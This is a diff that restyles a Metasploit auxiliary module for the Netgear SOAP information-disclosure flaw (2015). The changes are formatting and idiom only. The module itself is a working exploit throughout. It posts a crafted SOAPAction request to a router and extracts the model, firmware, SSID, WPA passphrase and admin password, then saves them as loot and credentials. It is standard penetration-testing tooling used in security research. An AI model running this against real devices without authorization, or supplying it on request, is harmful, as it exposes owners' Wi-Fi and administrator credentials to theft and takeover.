@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -38,8 +38,8 @@ class MetasploitModule < Msf::Auxiliary
       'Author'      =>
         [
           'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
-          'Michael Messner <devnull[at]s3cur1ty.de>',	     # Metasploit module
-          'h00die <mike@shorebreaksecurity.com>'       # Metasploit enhancements/docs
+          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module
+          'h00die <mike@shorebreaksecurity.com>' # Metasploit enhancements/docs
         ],
       'License'     => MSF_LICENSE,
       'DisclosureDate' => 'Feb 11 2015'
@@ -72,14 +72,12 @@ class MetasploitModule < Msf::Auxiliary
 
   def extract_data(soap_action)
     begin
-      res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => '/',
-        'headers' => {
-          'SOAPAction' => soap_action,
-        },
-        'data'    => '='
-      })
+      res = send_request_cgi('method' => 'POST',
+                             'uri'     => '/',
+                             'headers' => {
+                               'SOAPAction' => soap_action
+                             },
+                             'data' => '=')
 
       return if res.nil?
       return if res.code == 404
@@ -93,31 +91,31 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       if res.body =~ /<ModelName>(.*)<\/ModelName>/
-        model_name = $1
+        model_name = Regexp.last_match(1)
         print_good("Model #{model_name} found")
       end
 
       if res.body =~ /<Firmwareversion>(.*)<\/Firmwareversion>/
-        firmware_version = $1
+        firmware_version = Regexp.last_match(1)
         print_good("Firmware version #{firmware_version} found")
 
-        #store all details as loot
+        # store all details as loot
         loot = store_loot('netgear_soap_device.config', 'text/plain', rhost, res.body)
         print_good("Device details downloaded to: #{loot}")
       end
 
       if res.body =~ /<NewSSID>(.*)<\/NewSSID>/
-        ssid = $1
+        ssid = Regexp.last_match(1)
         print_good("Wifi SSID: #{ssid}")
       end
 
       if res.body =~ /<NewBasicEncryptionModes>(.*)<\/NewBasicEncryptionModes>/
-        wifi_encryption = $1
+        wifi_encryption = Regexp.last_match(1)
         print_good("Wifi Encryption: #{wifi_encryption}")
       end
 
       if res.body =~ /<NewWPAPassphrase>(.*)<\/NewWPAPassphrase>/
-        wifi_password = $1
+        wifi_password = Regexp.last_match(1)
         print_good("Wifi Password: #{wifi_password}")
       end
 
@@ -129,38 +127,37 @@ class MetasploitModule < Msf::Auxiliary
 
   def extract_credentials(body)
     body.each_line do |line|
-      if line =~ /<NewPassword>(.*)<\/NewPassword>/
-        pass = $1
-        print_good("admin / #{pass} credentials found")
+      next unless line =~ /<NewPassword>(.*)<\/NewPassword>/
+      pass = Regexp.last_match(1)
+      print_good("admin / #{pass} credentials found")
 
-        service_data = {
-          address: rhost,
-          port: rport,
-          service_name: 'http',
-          protocol: 'tcp',
-          workspace_id: myworkspace_id
-        }
+      service_data = {
+        address: rhost,
+        port: rport,
+        service_name: 'http',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+      }
 
-        credential_data = {
-          module_fullname: self.fullname,
-          origin_type: :service,
-          private_data: pass,
-          private_type: :password,
-          username: 'admin'
-        }
+      credential_data = {
+        module_fullname: fullname,
+        origin_type: :service,
+        private_data: pass,
+        private_type: :password,
+        username: 'admin'
+      }
 
-        credential_data.merge!(service_data)
+      credential_data.merge!(service_data)
 
-        credential_core = create_credential(credential_data)
+      credential_core = create_credential(credential_data)
 
-        login_data = {
-          core: credential_core,
-          status: Metasploit::Model::Login::Status::UNTRIED
-        }
-        login_data.merge!(service_data)
+      login_data = {
+        core: credential_core,
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
+      login_data.merge!(service_data)
 
-        create_credential_login(login_data)
-      end
+      create_credential_login(login_data)
     end
 
     # store all details as loot
